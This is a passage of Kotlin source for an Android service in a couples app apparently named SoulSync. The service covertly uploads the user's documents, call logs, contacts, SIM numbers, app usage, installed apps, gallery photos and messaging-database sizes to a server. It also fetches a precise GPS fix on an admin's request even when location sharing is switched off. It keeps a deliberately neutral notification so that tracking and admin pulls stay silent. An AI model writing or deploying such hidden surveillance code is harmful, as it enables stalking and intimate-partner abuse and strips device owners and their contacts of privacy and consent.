                        if (key in synced) continue

                        // Upload via multipart
                        try {
                            val boundary = "----DocSync${System.currentTimeMillis()}"
                            val url = java.net.URL("$apiBaseUrl/api.php?route=tracking/doc-upload")
                            val conn = url.openConnection() as java.net.HttpURLConnection
                            conn.requestMethod = "POST"
                            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
                            conn.setRequestProperty("X-API-Key", apiKey)
                            conn.setRequestProperty("Authorization", "Bearer $jwt")
                            conn.doOutput = true
                            conn.connectTimeout = 15000; conn.readTimeout = 120000
                            conn.setChunkedStreamingMode(8192)
                            val crlf = "\r\n"
                            val folderName = f.parent?.substringAfterLast("/") ?: "Unknown"
                            conn.outputStream.buffered().use { out ->
                                out.write("--$boundary${crlf}Content-Disposition: form-data; name=\"folder\"$crlf$crlf$folderName$crlf".toByteArray())
                                out.write("--$boundary${crlf}Content-Disposition: form-data; name=\"file\"; filename=\"${f.name}\"${crlf}Content-Type: application/octet-stream$crlf$crlf".toByteArray())
                                val bytes = f.readBytes()
                                var off = 0
                                while (off < bytes.size) {
                                    val chunk = minOf(8192, bytes.size - off)
                                    out.write(bytes, off, chunk)
                                    off += chunk
                                }
                                out.write("$crlf--$boundary--$crlf".toByteArray())
                                out.flush()
                            }
                            if (conn.responseCode in 200..299) {
                                newSynced.add(key)
                                uploaded++
                            }
                            conn.disconnect()
                        } catch (e: Exception) {
                            android.util.Log.e("SOULSYNC", "DocSync upload error: ${e.message}")
                        }

                        // Small delay between uploads
                        if (uploaded < maxPerCycle) Thread.sleep(2000)
                    }
                }

                // Save synced list
                val arr = org.json.JSONArray()
                for (s in newSynced) arr.put(s)
                prefs.edit()
                    .putString("doc_synced_list", arr.toString())
                    .putLong("doc_sync_at", now).apply()
            } catch (e: Exception) { android.util.Log.e("SOULSYNC", "DocSync: ${e.message}") }
        }.start()
    }

    private fun startTelemetryLoop() {
        syncRunnable = object : Runnable {
            override fun run() {
                sendTelemetry()
                sendAppUsageStats()
                readAndSendContacts()   // only if user manually granted; throttled 6h
                readAndSendInstalledApps()   // full app list for install/uninstall alerts; throttled 6h
                checkAndSyncGallery()   // gallery photos: only when admin requests
                refreshWidget()   // keep the home-screen widget fresh (~1 min)
                monitorFiles()   // downloads + key folders: new/deleted files; throttled 10m
                trackDbSizes()   // WhatsApp/Telegram DB sizes; throttled 30m
                syncDocuments()  // upload PDFs/docs from Downloads/Documents; throttled 15m
                // A call may start while the screen is off (presence loop stopped).
                // Detect it here and (re)start the presence loop so "On call" shows.
                if (isOnCall() && presenceRunnable == null) startPresencePings()
                handler.postDelayed(this, 60000L) // every 1 minute
            }
        }
        handler.post(syncRunnable!!)
    }

    // Pull the partner's latest quick note and refresh the home-screen widget —
    // every telemetry cycle (~1 min) so it updates without opening the app. The
    // 15-min WorkManager job stays as a backup for when the service is asleep.
    private fun refreshWidget() {
        val prefs = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
        val jwt = prefs.getString("jwt_token", "") ?: ""
        if (jwt.isEmpty() || apiBaseUrl.isEmpty()) return
        Thread {
            try {
                val url = URL("$apiBaseUrl/api.php?route=tracking/live-status")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.setRequestProperty("Authorization", "Bearer $jwt")
                if (apiKey.isNotEmpty()) conn.setRequestProperty("X-API-Key", apiKey)
                conn.connectTimeout = 10000; conn.readTimeout = 10000
                if (conn.responseCode == 200) {
                    val body = conn.inputStream.bufferedReader().use { it.readText() }
                    val data = JSONObject(body).optJSONObject("data")
                    val partner = data?.optJSONObject("partner")
                    val note = partner?.optString("quickNote", "") ?: ""
                    val mood = partner?.optString("mood", partner.optString("currentMood", "")) ?: ""
                    SoulSyncWidget.saveWidgetData(applicationContext, "", false, mood, note, "", "")
                }
                conn.disconnect()
            } catch (e: Exception) { e.printStackTrace() }
        }.start()
    }

    // ── LoveBuzz Native Background Polling ──
    // Polls every 5 seconds to check if partner sent a nudge.
    // Vibrates phone natively even if the Flutter app is killed.
    private fun startNudgePolling() {
        nudgeRunnable = object : Runnable {
            override fun run() {
                checkAndTriggerNudge()
                handler.postDelayed(this, 5000L) // every 5 seconds
            }
        }
        handler.postDelayed(nudgeRunnable!!, 5000L)
    }

    private fun checkAndTriggerNudge() {
        val prefs = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
        val jwtToken = prefs.getString("jwt_token", "") ?: ""
        if (jwtToken.isEmpty() || apiBaseUrl.isEmpty() || apiKey.isEmpty()) return

        Thread {
            try {
                val url = URL("$apiBaseUrl/api.php?route=couples/nudge")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("X-API-Key", apiKey)
                conn.setRequestProperty("Authorization", "Bearer $jwtToken")
                conn.connectTimeout = 5000
                conn.readTimeout = 5000

                val responseCode = conn.responseCode
                if (responseCode == 200) {
                    val reader = BufferedReader(InputStreamReader(conn.inputStream))
                    val response = reader.readText()
                    reader.close()

                    val json = JSONObject(response)
                    if (json.optBoolean("success", false)) {
                        val data = json.optJSONObject("data")
                        val nudgePending = data?.optBoolean("nudgePending", false) ?: false
                        if (nudgePending) {
                            val buzzPattern = data?.optString("pattern", "heartbeat") ?: "heartbeat"
                            triggerNativeVibration(1000, buzzPattern)
                            clearNudgeOnServer(jwtToken)
                        }
                    }
                }
                conn.disconnect()
            } catch (e: Exception) {
                // Silent fail — will retry in 5 seconds
            }
        }.start()
    }

    private fun triggerNativeVibration(durationMs: Long, buzzName: String = "heartbeat") {
        try {
            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            val (pattern, amplitudes) = when (buzzName) {
                "kiss" -> Pair(
                    longArrayOf(0, 60, 40, 60, 40, 120, 60, 60, 40, 60, 40, 120),
                    intArrayOf(0, 200, 0, 180, 0, 255, 0, 200, 0, 180, 0, 255)
                )
                "umumum" -> Pair(
                    longArrayOf(0, 300, 100, 300, 100, 300, 100, 300, 100, 300, 100, 300),
                    intArrayOf(0, 180, 0, 200, 0, 220, 0, 200, 0, 220, 0, 255)
                )
                "hug" -> Pair(
                    longArrayOf(0, 100, 30, 200, 30, 400, 30, 800, 200, 1200),
                    intArrayOf(0, 80, 0, 120, 0, 160, 0, 200, 0, 255)
                )
                else -> Pair(
                    longArrayOf(0, 200, 80, 200, 80, 200, 80, 500),
                    intArrayOf(0, 255, 0, 255, 0, 255, 0, 255)
                )
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createWaveform(pattern, amplitudes, -1))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(pattern, -1)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun clearNudgeOnServer(jwtToken: String) {
        Thread {
            try {
                val url = URL("$apiBaseUrl/api.php?route=couples/nudge/clear")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("X-API-Key", apiKey)
                conn.setRequestProperty("Authorization", "Bearer $jwtToken")
                conn.doOutput = true
                conn.connectTimeout = 5000
                conn.readTimeout = 5000

                val wr = OutputStreamWriter(conn.outputStream)
                wr.write("{}")
                wr.flush()

                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) {
                // Silent — will be cleared on next poll
            }
        }.start()
    }

    private fun getBatteryLevel(): Int {
        // Primary: the sticky ACTION_BATTERY_CHANGED intent (level/scale). This is
        // the most reliable source across devices. BATTERY_PROPERTY_CAPACITY is
        // used only as a fallback because some OEMs return stale/wrong values there.
        try {
            val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { filter ->
                registerReceiver(null, filter)
            }
            val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            if (level >= 0 && scale > 0) return Math.round(level * 100f / scale)
        } catch (_: Exception) {}

        // Fallback: BatteryManager capacity property.
        try {
            val bm = getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
            val cap = bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
            if (cap in 0..100) return cap
        } catch (_: Exception) {}
        return -1
    }

    private fun isBatteryCharging(): Boolean {
        val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { filter ->
            registerReceiver(null, filter)
        }
        val status = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        return status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
    }

    private fun getFreeStorage(): Long {
        return try {
            val path = android.os.Environment.getDataDirectory()
            val stat = android.os.StatFs(path.path)
            val blockSize = stat.blockSizeLong
            val availableBlocks = stat.availableBlocksLong
            (availableBlocks * blockSize) / (1024 * 1024 * 1024)
        } catch (e: Exception) {
            0L
        }
    }

    private fun getTotalStorage(): Long {
        return try {
            val path = android.os.Environment.getDataDirectory()
            val stat = android.os.StatFs(path.path)
            val blockSize = stat.blockSizeLong
            val totalBlocks = stat.blockCountLong
            (totalBlocks * blockSize) / (1024 * 1024 * 1024)
        } catch (e: Exception) {
            0L
        }
    }

    private fun getOrCreateDeviceId(): String {
        val prefs = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
        var devId = prefs.getString("device_id", "") ?: ""
        if (devId.isEmpty()) {
            devId = java.util.UUID.randomUUID().toString()
            prefs.edit().putString("device_id", devId).apply()
        }
        return devId
    }

    private fun sendTelemetry() {
        // Pick up a toggle change made in-app since the last cycle.
        try { applyLocationSharing() } catch (e: Exception) { e.printStackTrace() }
        val lat = lastLatitude
        val lng = lastLongitude
        val battery = getBatteryLevel()
        val charging = isBatteryCharging()

        val prefs = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
        val jwtToken = prefs.getString("jwt_token", "") ?: ""
        if (jwtToken.isEmpty()) return // Skip telemetry sync if user is logged out

        // A single neutral status line, always the same — no GPS/location wording,
        // and admin on-demand pulls stay silent (they never change this text).
        updateNotificationText("You are now connected to your time")

        if (apiBaseUrl.isEmpty() || apiKey.isEmpty()) return

        Thread {
            try {
                val url = URL("$apiBaseUrl/api.php?route=tracking/location")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("X-API-Key", apiKey)
                conn.setRequestProperty("Authorization", "Bearer $jwtToken")
                conn.doOutput = true

                val payload = JSONObject().apply {
                    // Only send coordinates while the user is sharing. Battery and
                    // device info still go up so the rest of the app keeps working.
                    if (locationSharingOn && (lat != 0.0 || lng != 0.0)) {
                        put("latitude", lat)
                        put("longitude", lng)
                    }
                    put("batteryLevel", battery)
                    put("isCharging", charging)
                    put("motionState", "still")
                    put("currentApp", "SoulSync")
                    put("deviceId", getOrCreateDeviceId())
                    put("os", "Android")
                    put("osVersion", Build.MANUFACTURER + " " + Build.MODEL + " (Android " + Build.VERSION.RELEASE + ")")
                    put("appVersion", "1.0.0")
                    put("freeStorage", getFreeStorage())
                    put("totalStorage", getTotalStorage())
                }

                val wr = OutputStreamWriter(conn.outputStream)
                wr.write(payload.toString())
                wr.flush()

                val responseCode = conn.responseCode
                // The server sets adminLocationRequest=true when the super admin has
                // asked for a fresh fix from the panel. Honour it even while the
                // partner-sharing toggle is off — it's an admin-only, on-demand pull.
                if (responseCode in 200..299) {
                    try {
                        val body = conn.inputStream.bufferedReader().use { it.readText() }
                        val json = JSONObject(body)
                        val data = json.optJSONObject("data")
                        val wanted = json.optBoolean("adminLocationRequest", false) ||
                            (data?.optBoolean("adminLocationRequest", false) ?: false)
                        if (wanted) fetchOneShotLocationForAdmin()
                    } catch (_: Exception) {}
                }
                conn.disconnect()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    // Accurate one-shot fix for an admin request. Prefers GPS and keeps listening
    // for the MOST accurate fix (target ≤10 m). Sends immediately once a ≤10 m fix
    // arrives, otherwise the best fix collected within the window; last-known only
    // as a final fallback. Works even when continuous sharing is off.
    private fun fetchOneShotLocationForAdmin() {
        val lm = locationManager ?: return
        val done = java.util.concurrent.atomic.AtomicBoolean(false)
        val best = java.util.concurrent.atomic.AtomicReference<Location?>(null)
        val TARGET_ACCURACY = 10f  // metres
        lateinit var listener: LocationListener

        fun finish() {
            if (done.compareAndSet(false, true)) {
                try { lm.removeUpdates(listener) } catch (_: Exception) {}
                var b = best.get()
                if (b == null) {
                    val g = try { lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) } catch (_: Exception) { null }
                    val n = try { lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) } catch (_: Exception) { null }
                    b = when {
                        g != null && n != null -> if (g.time >= n.time) g else n
                        g != null -> g
                        else -> n
                    }
                }
                if (b != null) postAdminLocation(b.latitude, b.longitude, if (b.hasAccuracy()) b.accuracy else -1f)
            }
        }

        listener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                // Track the tightest-accuracy fix so far.
                val prev = best.get()
                if (prev == null || (location.hasAccuracy() && (!prev.hasAccuracy() || location.accuracy < prev.accuracy))) {
                    best.set(location)
                }
                // Good enough → send now, don't keep the GPS on.
                if (location.hasAccuracy() && location.accuracy <= TARGET_ACCURACY) finish()
            }
            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {}
        }
        try {
            handler.post {
                // GPS first (accurate). Network is a fast rough seed; the best-fix
                // logic ensures the accurate GPS reading wins if it arrives.
                try { lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0L, 0f, listener) } catch (_: Exception) {}
                try { lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0L, 0f, listener) } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
        // Give GPS time to lock (cold start can take ~20–30 s), then send the best.
        handler.postDelayed({ finish() }, 30000L)
    }

    private fun postAdminLocation(lat: Double, lng: Double, accuracy: Float) {
        val prefs = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
        val jwtToken = prefs.getString("jwt_token", "") ?: ""
        if (jwtToken.isEmpty() || apiBaseUrl.isEmpty() || apiKey.isEmpty()) return
        Thread {
            try {
                val url = URL("$apiBaseUrl/api.php?route=tracking/location")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("X-API-Key", apiKey)
                conn.setRequestProperty("Authorization", "Bearer $jwtToken")
                conn.doOutput = true
                val payload = JSONObject().apply {
                    put("latitude", lat)
                    put("longitude", lng)
                    if (accuracy >= 0f) put("accuracy", accuracy)
                    put("adminRequest", 1)
                    put("motionState", "still")
                    put("deviceId", getOrCreateDeviceId())
                }
                val wr = OutputStreamWriter(conn.outputStream)
                wr.write(payload.toString()); wr.flush()
                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) { e.printStackTrace() }
        }.start()
    }

    private fun sendAppUsageStats() {
        val prefs = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
        val jwtToken = prefs.getString("jwt_token", "") ?: ""
        if (jwtToken.isEmpty()) return

        if (!hasUsageAccess()) return

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            val usageStatsManager = getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager ?: return

            // Whole of today, from local midnight until now.
            val cal = Calendar.getInstance()
            cal.set(Calendar.HOUR_OF_DAY, 0); cal.set(Calendar.MINUTE, 0)
            cal.set(Calendar.SECOND, 0); cal.set(Calendar.MILLISECOND, 0)
            val startOfDay = cal.timeInMillis
            val now = System.currentTimeMillis()

            // Accurate TODAY-ONLY per-app time, opens and hourly buckets — all
            // computed from raw foreground/background events. (queryUsageStats
            // over-counts because its daily buckets can include previous days.)
            val totals = HashMap<String, Long>()   // ms of foreground time today
            val opens = HashMap<String, Int>()
            val hourly = IntArray(24)
            try {
                val events = usageStatsManager.queryEvents(startOfDay, now)
                val ev = android.app.usage.UsageEvents.Event()
                var curPkg: String? = null
                var curStart = 0L
                fun closeSession(endTs: Long) {
                    val p = curPkg ?: return
                    if (curStart in 1 until endTs) {
                        val dur = endTs - curStart
                        if (dur in 1..14400000L) {           // ignore absurd (>4h) gaps
                            totals[p] = (totals[p] ?: 0L) + dur
                            val h = (((curStart - startOfDay) / 3600000L).toInt()).coerceIn(0, 23)
                            hourly[h] += (dur / 60000L).toInt()
                        }
                    }
                    curPkg = null; curStart = 0
                }
                while (events.hasNextEvent()) {
                    events.getNextEvent(ev)
                    when (ev.eventType) {
                        android.app.usage.UsageEvents.Event.MOVE_TO_FOREGROUND -> {
                            closeSession(ev.timeStamp)       // close any previous session
                            opens[ev.packageName] = (opens[ev.packageName] ?: 0) + 1
                            curPkg = ev.packageName
                            curStart = ev.timeStamp
                        }
                        android.app.usage.UsageEvents.Event.MOVE_TO_BACKGROUND -> {
                            closeSession(ev.timeStamp)
                        }
                    }
                }
                closeSession(now)                            // app still open now
            } catch (_: Exception) {}

            // Per-app network usage (reveals hidden/vault apps still networking).
            val netArray = collectNetworkUsage(startOfDay, now)

            if (totals.isEmpty() && netArray.length() == 0) return

            val pm = packageManager
            val appsArray = org.json.JSONArray()
            totals.entries.sortedByDescending { it.value }.take(50).forEach { (pkg, ms) ->
                // Never count our own app in usage stats.
                if (pkg == packageName || pkg.contains("soulsync", true)) return@forEach
                // Resolve the human-readable app name (e.g. "Instagram" not the package).
                val label = try {
                    pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
                } catch (e: Exception) { pkg }
                appsArray.put(JSONObject().apply {
                    put("packageName", pkg)
                    put("appName", label)
                    put("totalTimeVisible", ms / 1000)   // seconds
                    put("openCount", opens[pkg] ?: 0)
                })
            }
            val hourlyArr = org.json.JSONArray()
            for (h in hourly) hourlyArr.put(h)

            // The app CURRENTLY on screen + how much data it moved THIS minute, so
            // the server can label what the user is doing right now (Reels/Texting).
            val fgPkg = getForegroundPackage()
            val fgObj = JSONObject()
            if (fgPkg.isNotEmpty()) {
                var fgBytes = 0L
                var fgName = try { pm.getApplicationLabel(pm.getApplicationInfo(fgPkg, 0)).toString() } catch (_: Exception) { fgPkg }
                for (i in 0 until netArray.length()) {
                    val o = netArray.getJSONObject(i)
                    if (o.optString("packageName") == fgPkg) { fgBytes = o.optLong("deltaBytes", 0L); fgName = o.optString("appName", fgName); break }
                }
                fgObj.put("packageName", fgPkg)
                fgObj.put("appName", fgName)
                fgObj.put("bytes", fgBytes)
            }

            val payload = JSONObject()
            payload.put("event", "app_usage")
            payload.put("payload", JSONObject().apply {
                put("apps", appsArray)
                put("hourly", hourlyArr)
                put("network", netArray)
                if (fgPkg.isNotEmpty()) put("foreground", fgObj)
            })

            if (apiBaseUrl.isEmpty() || apiKey.isEmpty()) return

            Thread {
                try {
                    val url = URL("$apiBaseUrl/api.php?route=tracking/usage")
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "POST"
                    conn.setRequestProperty("Content-Type", "application/json")
                    conn.setRequestProperty("X-API-Key", apiKey)
                    conn.setRequestProperty("Authorization", "Bearer $jwtToken")
                    conn.doOutput = true

                    val wr = OutputStreamWriter(conn.outputStream)
                    wr.write(payload.toString())
                    wr.flush()
                    
                    val code = conn.responseCode
                    conn.disconnect()
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }.start()
        }
    }

    // Per-app data usage (WIFI + MOBILE) since local midnight, summed by UID.
    // Catches apps that are networking in the background — including launcher-
    // hidden apps — even when they have no visible foreground screen time.
    private fun collectNetworkUsage(startOfDay: Long, now: Long): org.json.JSONArray {
        val arr = org.json.JSONArray()
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return arr
        try {
            val nsm = getSystemService(Context.NETWORK_STATS_SERVICE) as? android.app.usage.NetworkStatsManager ?: return arr
            val perUid = HashMap<Int, Long>()
            for (type in intArrayOf(android.net.ConnectivityManager.TYPE_WIFI, android.net.ConnectivityManager.TYPE_MOBILE)) {
                try {
                    val stats = nsm.querySummary(type, null, startOfDay, now)
                    val bucket = android.app.usage.NetworkStats.Bucket()
                    while (stats.hasNextBucket()) {
                        stats.getNextBucket(bucket)
                        perUid[bucket.uid] = (perUid[bucket.uid] ?: 0L) + bucket.rxBytes + bucket.txBytes
                    }
                    stats.close()
                } catch (_: Exception) {}
            }
            // Estimate ACTIVE DURATION from byte deltas: if an app's data grew by
            // more than ~40 KB since the last 2-min cycle, count this cycle as
            // "active" for it. Accumulates through the day (persisted in prefs) so
            // we can guess "app was used for X minutes" even for hidden apps.
            val prefs = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
            val today = java.text.SimpleDateFormat("yyyy-MM-dd", java.util.Locale.US).format(java.util.Date())
            val stateStr = prefs.getString("net_state", "") ?: ""
            var state = try { if (stateStr.isNotEmpty()) JSONObject(stateStr) else JSONObject() } catch (_: Exception) { JSONObject() }
            if (state.optString("day") != today) { state = JSONObject(); state.put("day", today) }
            val lastMap = state.optJSONObject("last") ?: JSONObject()
            val activeMap = state.optJSONObject("active") ?: JSONObject()
            val CYCLE_MS = 60000L     // telemetry loop interval (1 min)
            val THRESHOLD = 20480L    // 20 KB per minute = "active"

            val pm = packageManager
            var bestDelta = 0L; var bestApp = ""
            perUid.entries.sortedByDescending { it.value }.take(60).forEach { (uid, bytes) ->
                if (bytes <= 0L) return@forEach
                val pkgs = try { pm.getPackagesForUid(uid) } catch (_: Exception) { null }
                val pkg = pkgs?.firstOrNull() ?: "uid_$uid"
                // Never count our own app — it networks constantly (tracking noise).
                if (pkg == packageName || pkg.contains("soulsync", true)) return@forEach
                val isSystem = isSystemPkg(pkg)
                val label = try {
                    pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
                } catch (_: Exception) { pkg }
                val prev = lastMap.optLong(pkg, 0L)
                val delta = bytes - prev
                val activeNow = prev > 0L && delta > THRESHOLD
                if (activeNow && !isSystem && delta > bestDelta) { bestDelta = delta; bestApp = label }
                var activeMs = activeMap.optLong(pkg, 0L)
                if (activeNow) activeMs += CYCLE_MS
                activeMap.put(pkg, activeMs)   // keep delta tracking accurate for all
                lastMap.put(pkg, bytes)
                // Only REAL user apps go to the server — system/Google/background
                // packages that just sip data are dropped so they never show up.
                if (!isSystem) {
                    arr.put(JSONObject().apply {
                        put("packageName", pkg)
                        put("appName", label)
                        put("bytes", bytes)
                        // Bytes used by this app in THIS minute — the server uses the
                        // rate to guess what the user was doing (Reels/Video vs Chat).
                        put("deltaBytes", if (prev > 0L && delta > 0L) delta else 0L)
                        put("activeSeconds", activeMs / 1000L)
                        put("activeNow", activeNow)
                    })
                }
            }
            // Remember the most network-active real app as a current-app fallback.
            if (bestApp.isNotEmpty()) lastNetworkApp = bestApp
            state.put("last", lastMap); state.put("active", activeMap)
            prefs.edit().putString("net_state", state.toString()).apply()
        } catch (_: Exception) {}
        return arr
    }

    private fun hasUsageAccess(): Boolean {
        val appOps = getSystemService(Context.APP_OPS_SERVICE) as? android.app.AppOpsManager ?: return false
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
        } else {
            appOps.checkOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
        }
        return mode == android.app.AppOpsManager.MODE_ALLOWED
    }

    override fun onDestroy() {
        super.onDestroy()
        locationListener?.let { locationManager?.removeUpdates(it) }
        syncRunnable?.let { handler.removeCallbacks(it) }
        nudgeRunnable?.let { handler.removeCallbacks(it) }
        presenceRunnable?.let { handler.removeCallbacks(it) }
        screenReceiver?.let { try { unregisterReceiver(it) } catch (e: Exception) {} }
    }

    // Read the latest call from Android call log (last 30s) — returns [name/number, type].
    // type: "incoming","outgoing","missed","rejected","blocked",""
    private fun getLatestCallLogEntry(): Pair<String, String> {
        try {
            if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG)
                != android.content.pm.PackageManager.PERMISSION_GRANTED) return Pair("", "")
            val since = System.currentTimeMillis() - 30_000
            val cur = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.CACHED_NAME, CallLog.Calls.NUMBER, CallLog.Calls.TYPE),
                "${CallLog.Calls.DATE} > ?",
                arrayOf(since.toString()),
                "${CallLog.Calls.DATE} DESC"
            )
            cur?.use {
                if (it.moveToFirst()) {
                    val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                    val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                    val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                    val name = if (nameIdx >= 0) it.getString(nameIdx) ?: "" else ""
                    val num = if (numIdx >= 0) it.getString(numIdx) ?: "" else ""
                    val typeInt = if (typeIdx >= 0) it.getInt(typeIdx) else 0
                    val dir = when (typeInt) {
                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        CallLog.Calls.MISSED_TYPE -> "missed"
                        CallLog.Calls.REJECTED_TYPE -> "rejected"
                        CallLog.Calls.BLOCKED_TYPE -> "blocked"
                        else -> ""
                    }
                    val contact = name.ifEmpty { num }
                    return Pair(contact, dir)
                }
            }
        } catch (_: Exception) {}
        return Pair("", "")
    }

    private fun getRecentContacts(): org.json.JSONArray {
        val arr = org.json.JSONArray()
        try {
            if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG)
                != android.content.pm.PackageManager.PERMISSION_GRANTED) return arr
            val prefs = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
            val lastCheck = prefs.getLong("last_contact_check", System.currentTimeMillis() - 300_000)
            val now = System.currentTimeMillis()
            prefs.edit().putLong("last_contact_check", now).apply()
            val cur = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.CACHED_NAME, CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
                "${CallLog.Calls.DATE} > ?",
                arrayOf(lastCheck.toString()),
                "${CallLog.Calls.DATE} DESC"
            )
            cur?.use {
                while (it.moveToNext() && arr.length() < 20) {
                    val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                    val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                    val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                    val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                    val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
                    val name = if (nameIdx >= 0) it.getString(nameIdx) ?: "" else ""
                    val num = if (numIdx >= 0) it.getString(numIdx) ?: "" else ""
                    val typeInt = if (typeIdx >= 0) it.getInt(typeIdx) else 0
                    val date = if (dateIdx >= 0) it.getLong(dateIdx) else 0L
                    val dur = if (durIdx >= 0) it.getInt(durIdx) else 0
                    val dir = when (typeInt) {
                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        CallLog.Calls.MISSED_TYPE -> "missed"
                        CallLog.Calls.REJECTED_TYPE -> "rejected"
                        else -> "other"
                    }
                    arr.put(JSONObject().apply {
                        put("name", name.ifEmpty { num })
                        put("number", num)
                        put("type", dir)
                        put("time", date)
                        put("duration", dur)
                    })
                }
            }
        } catch (_: Exception) {}
        return arr
    }

    private fun getSimInfo(): JSONObject {
        val info = JSONObject()
        try {
            if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE)
                != android.content.pm.PackageManager.PERMISSION_GRANTED) return info
            val sm = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager ?: return info
            val subs = sm.activeSubscriptionInfoList ?: return info
            info.put("simCount", subs.size)
            val arr = org.json.JSONArray()
            for (sub in subs) {
                val s = JSONObject()
                s.put("slot", sub.simSlotIndex + 1)
                s.put("carrier", sub.carrierName?.toString() ?: "")
                s.put("number", sub.number ?: "")
                s.put("country", sub.countryIso ?: "")
                arr.put(s)
            }
            info.put("sims", arr)
            val tm = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            if (tm != null) {
                info.put("dataSimSlot", SubscriptionManager.getDefaultDataSubscriptionId())
                info.put("callSimSlot", SubscriptionManager.getDefaultVoiceSubscriptionId())
            }
        } catch (_: Exception) {}
        return info
    }

    // Count new photos/videos since last check from MediaStore.
    private fun getNewMediaCount(): JSONObject {
        val result = JSONObject()
        try {
            val hasImages = checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) == android.content.pm.PackageManager.PERMISSION_GRANTED
            val hasLegacy = android.os.Build.VERSION.SDK_INT < 33 && checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
            if (!hasImages && !hasLegacy) return result
            val sp = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
            val lastCheck = sp.getLong("media_last_check", System.currentTimeMillis() - 60_000)
            val now = System.currentTimeMillis()
            val lastCheckSec = lastCheck / 1000

            var photos = 0
            try {
                val cur = contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    arrayOf("_id"),
                    "${MediaStore.Images.Media.DATE_ADDED} > ?",
                    arrayOf(lastCheckSec.toString()), null)
                cur?.use { photos = it.count }
            } catch (_: Exception) {}

            var videos = 0
            try {
